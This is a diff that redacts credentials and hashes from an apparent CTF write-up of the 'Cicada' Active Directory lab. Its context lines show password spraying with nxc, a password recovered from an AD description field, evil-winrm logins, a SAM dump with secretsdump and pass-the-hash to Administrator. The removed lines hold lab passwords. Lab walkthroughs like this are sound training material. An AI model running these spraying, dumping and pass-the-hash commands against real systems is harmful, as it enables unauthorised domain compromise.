@@ -109,7 +109,7 @@ Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our
 security protocols, it's essential that you change your default password to something
 unique and secure.
 
-Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+Your default password is: <REDACTED>
 
 To change your password:
 
@@ -159,26 +159,26 @@ nxc smb cicada.htb -u "guest" -p "" --pass-pol
 We confirm there is no lockout threshold (verified in full after gaining credentials — see AD Enumeration). Safe to spray.
 
 ```bash
-nxc smb CICADA-DC.cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
+nxc smb CICADA-DC.cicada.htb -u users.txt -p '<REDACTED>' --continue-on-success
 ```
 
 ```
-[-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8    STATUS_LOGON_FAILURE
-[-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8   STATUS_LOGON_FAILURE
-[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
-[-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8   STATUS_LOGON_FAILURE
-[-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8     STATUS_LOGON_FAILURE
+[-] cicada.htb\john.smoulder:<REDACTED>    STATUS_LOGON_FAILURE
+[-] cicada.htb\sarah.dantelia:<REDACTED>   STATUS_LOGON_FAILURE
+[+] cicada.htb\michael.wrightson:<REDACTED>
+[-] cicada.htb\david.orelious:<REDACTED>   STATUS_LOGON_FAILURE
+[-] cicada.htb\emily.oscars:<REDACTED>     STATUS_LOGON_FAILURE
 ```
 
 `michael.wrightson` never changed the default. Verify shares and check WinRM:
 
 ```bash
-nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
-nxc winrm cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
+nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p '<REDACTED>' --shares
+nxc winrm cicada.htb -u michael.wrightson -p '<REDACTED>'
 ```
 
 ```
-[-] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+[-] cicada.htb\michael.wrightson:<REDACTED>
 ```
 
 `michael.wrightson` has SYSVOL read access (checked for GPP `Groups.xml` — nothing found) but is not in Remote Management Users. No shell yet.
@@ -190,7 +190,7 @@ nxc winrm cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ### BloodHound Collection
 
 ```bash
-nxc ldap CICADA-DC.cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' \
+nxc ldap CICADA-DC.cicada.htb -u michael.wrightson -p '<REDACTED>' \
     --bloodhound -c All --dns-server <DC_IP>
 ```
 
@@ -211,7 +211,7 @@ Ingest the zip into BloodHound and run the pre-built queries. `michael.wrightson
 The nmap SSL cert issuer flagged an internal CA. We enumerate it with `certipy`:
 
 ```bash
-certipy find -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' \
+certipy find -u michael.wrightson -p '<REDACTED>' \
     -dc-ip <DC_IP> -text -enabled -vulnerable
 ```
 
@@ -227,7 +227,7 @@ The `CN=Enrollment Services` container is empty — the CA is not published in A
 ### Password Policy
 
 ```bash
-nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --pass-pol
+nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p '<REDACTED>' --pass-pol
 ```
 
 ```
@@ -251,11 +251,11 @@ No lockout threshold — further spraying carries no account lockout risk.
 ### Password in AD Description Field
 
 ```bash
-nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
+nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p '<REDACTED>' --users
 ```
 
 ```
-david.orelious    Just in case I forget my password is aRt$Lp#7t*VQ!3
+david.orelious    Just in case I forget my password is <REDACTED>
 ```
 
 `david.orelious` stored his password verbatim in his own AD account description — readable by any authenticated domain user. RID brute-force does not expose description fields; `--users` is required.
@@ -263,11 +263,11 @@ david.orelious    Just in case I forget my password is aRt$Lp#7t*VQ!3
 ### DEV Share Access
 
 ```bash
-nxc smb CICADA-DC.cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
+nxc smb CICADA-DC.cicada.htb -u david.orelious -p '<REDACTED>' --shares
 ```
 
 ```
-SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
+SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\david.orelious:<REDACTED>
 SMB  10.129.231.149  445  CICADA-DC  DEV          READ
 SMB  10.129.231.149  445  CICADA-DC  HR           READ
 SMB  10.129.231.149  445  CICADA-DC  NETLOGON     READ
@@ -299,7 +299,7 @@ $sourceDirectory = "C:\smb"
 $destinationDirectory = "D:\Backup"
 
 $username = "emily.oscars"
-$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$password = ConvertTo-SecureString "<REDACTED>" -AsPlainText -Force
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
 
 $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
@@ -309,16 +309,16 @@ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
 
-`emily.oscars`'s password is hardcoded in plaintext (`Q!3@Lp#M6b*7t*Vt`). The script lands on a share readable by a lateral account, making credential exposure inevitable.
+`emily.oscars`'s password is hardcoded in plaintext (`<REDACTED>`). The script lands on a share readable by a lateral account, making credential exposure inevitable.
 
 ### Verifying Access
 
 ```bash
-nxc smb CICADA-DC.cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
+nxc smb CICADA-DC.cicada.htb -u emily.oscars -p '<REDACTED>' --shares
 ```
 
 ```
-SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt
+SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\emily.oscars:<REDACTED>
 SMB  10.129.231.149  445  CICADA-DC  ADMIN$       READ
 SMB  10.129.231.149  445  CICADA-DC  C$           READ,WRITE
 SMB  10.129.231.149  445  CICADA-DC  HR           READ
@@ -329,15 +329,15 @@ SMB  10.129.231.149  445  CICADA-DC  SYSVOL       READ
 `emily.oscars` has `READ,WRITE` on `C$` and `READ` on `ADMIN$` — near-admin SMB access. WinRM confirms a shell is available:
 
 ```bash
-nxc winrm cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+nxc winrm cicada.htb -u emily.oscars -p '<REDACTED>'
 ```
 
 ```
-[+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
+[+] cicada.htb\emily.oscars:<REDACTED> (Pwn3d!)
 ```
 
 ```bash
-evil-winrm -i <DC_IP> -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+evil-winrm -i <DC_IP> -u emily.oscars -p '<REDACTED>'
 ```
 
 ```
@@ -395,9 +395,9 @@ secretsdump.py -sam sam -system system LOCAL
 ```
 
 ```
-[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Target system bootKey: <REDACTED>
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
@@ -406,7 +406,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 No cracking required. We authenticate directly with the NT hash using Evil-WinRM's `-H` flag:
 
 ```bash
-evil-winrm -i <DC_IP> -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
+evil-winrm -i <DC_IP> -u Administrator -H '<REDACTED>'
 ```
 
 ```
@@ -420,7 +420,7 @@ Full domain compromise. Root flag on the Administrator's desktop.
 
 > **Alternative — NetExec `backup_operator` module:** Automates the hive extraction without dropping into a shell first:
 > ```bash
-> nxc smb <DC_IP> -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -M backup_operator
+> nxc smb <DC_IP> -u emily.oscars -p '<REDACTED>' -M backup_operator
 > ```
 > Requires the same Backup Operators membership. Replaces the manual `reg save` + download steps.
 
